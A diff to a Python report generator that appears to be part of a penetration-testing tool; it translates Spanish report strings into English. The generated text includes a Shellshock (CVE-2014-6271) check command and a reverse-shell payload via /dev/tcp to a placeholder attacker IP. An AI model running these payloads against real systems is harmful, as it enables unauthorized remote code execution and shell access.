@@ -567,7 +567,7 @@ class Session:
         # editing anything.
         if self.info.cgi_scripts_found:
             lines += [
-                "## ☢️ ALERTA ROJA — CGI Script Attack Surface",
+                "## ☢️ RED ALERT — CGI Script Attack Surface",
                 "",
                 "> **Executable scripts were discovered dynamically by the CGI sniper.**  ",
                 "> Test EACH URL for Shellshock (CVE-2014-6271) and parameter injection.",
@@ -578,13 +578,13 @@ class Session:
                 lines += [
                     "---",
                     "",
-                    "### ☢️ ALERTA ROJA: VULNERABILIDAD CGI/SHELLSHOCK POTENCIAL",
+                    "### ☢️ RED ALERT: POTENTIAL CGI/SHELLSHOCK VULNERABILITY",
                     "",
-                    f"Se ha descubierto un script ejecutable en una ruta dinámica: `{url}`",
+                    f"An executable script was discovered at a dynamic path: `{url}`",
                     "",
-                    "Vector de ataque para RCE:",
+                    "RCE attack vector:",
                     "",
-                    f'- [ ] **Comprobar:** `curl -H "User-Agent: () {{ :; }}; echo; /usr/bin/id" {url}`',
+                    f'- [ ] **Verify:** `curl -H "User-Agent: () {{ :; }}; echo; /usr/bin/id" {url}`',
                     f'- [ ] Reverse Shell: `curl -H "User-Agent: () {{ :; }}; echo; /bin/bash -i >& /dev/tcp/<YOUR_IP>/4444 0>&1" {url}`',
                     "",
                     "> 💡 **TACTICAL NEXT STEP** — You are likely landing as a web service "
